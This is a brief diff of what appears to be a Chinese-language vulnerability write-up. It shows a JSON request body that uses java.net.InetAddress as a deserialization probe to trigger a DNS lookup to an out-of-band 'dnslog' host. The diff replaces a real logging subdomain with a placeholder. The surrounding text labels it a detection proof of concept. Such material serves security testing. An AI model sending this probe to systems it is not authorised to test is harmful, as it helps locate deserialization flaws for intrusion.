@@ -16,7 +16,7 @@ Host: 127.0.0.1:8090
 Content-Type: application/json
 Content-Length: 73
 
-["java.net.InetAddress","wrr3lwmccgyqyg7lw9zvr8d8fzlq9gx5.b.huskpup.com"]
+["java.net.InetAddress","dnslog地址"]
 ```
 
 探测poc:
